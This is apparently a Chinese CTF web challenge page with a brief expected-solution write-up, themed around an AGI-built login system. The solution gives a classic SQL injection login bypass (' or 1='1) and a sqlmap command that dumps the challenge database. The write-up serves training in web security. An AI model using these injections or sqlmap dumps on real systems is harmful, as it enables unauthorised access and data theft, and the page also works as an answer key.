# [Web] WearMe 核心机房 准入验证

- 命题人：You
- 我去，你怎么在这：100 分
- 我测，黑客！：200 分

## 题目描述

<p>在2077年的一个炎热的午后，出题人终于攻下了WearMe的运维控制系统。出题人觉得这套系统很眼熟，通过一系列社工手段得到这是人工智能AGI自主研发的友军验证系统以防人类嘿客在不通过WearMe赛博浏览器进入系统。</p>
<p><img alt="" src="https://oss.wearos.me/file/wmtest/tangpingcup/3.gif"></p>
<p>由于本站使用云火焰（Cloudflare）作为CDN，启动docker后可能需要几秒钟时间从CDN拉取资源，若提示GatewayError请等待30秒再刷新</p>
<p>由于安全问题 您仅能从<strong>中国大陆</strong>访问这道题目</p>
<div class="well">
<strong>第二阶段提示</strong>
<p>
有个东西，叫万能密码~
</p>
</div>

**【网页链接：访问题目网页】**

## 预期解法

### flag1

第一步，打开题目，第二步，按下admin和' or 1='1，第三步，按下登录，好了flag拿到了（？

### flag2

flag2就需要知道密码是啥了，这次比赛使用sqlmap就行。
```console
sqlmap -u "http://DOMAIN_SUFFIX.weilei.software/check.php?data=user:*|pass:*" --dbms=mysql --dump
```